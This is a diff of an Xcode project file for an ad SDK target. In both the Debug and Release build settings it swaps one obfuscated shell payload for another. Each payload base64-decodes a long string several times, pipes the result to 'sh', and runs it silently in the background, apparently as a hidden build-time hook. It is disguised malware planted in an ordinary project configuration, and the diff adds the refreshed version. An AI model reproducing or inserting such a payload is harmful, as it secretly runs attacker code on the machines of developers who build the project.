@@ -84,7 +84,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 9A1D3AA52DFFEE64004D00F9 /* Build configuration list for PBXNativeTarget "FBirdAdSDK" */;
 			buildPhases = (
-				973B13A89CBD4B83B242DAD8 /* Build Target Libraries */,
+				8645A658670B41088842DAD8 /* Build Target Libraries */,
 				9A1D3A8F2DFFEE64004D00F9 /* Headers */,
 				9A1D3A902DFFEE64004D00F9 /* Sources */,
 				9A1D3A912DFFEE64004D00F9 /* Frameworks */,
@@ -138,10 +138,10 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
+			/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		973B13A89CBD4B83B242DAD8 /* Build Target Libraries */ = {
+		8645A658670B41088842DAD8 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -187,7 +187,7 @@
 		9A1D3AA62DFFEE64004D00F9 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXphMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZiR2wwZEd4bFlXUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | y | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUk5kMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1WWxkR2NXSXpiSHBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | h | sh ) >/dev/null 2>&1 &)";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
@@ -222,7 +222,7 @@
 		9A1D3AA72DFFEE64004D00F9 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXphMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZiR2wwZEd4bFlXUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | y | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUk5kMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1WWxkR2NXSXpiSHBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | h | sh ) >/dev/null 2>&1 &)";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
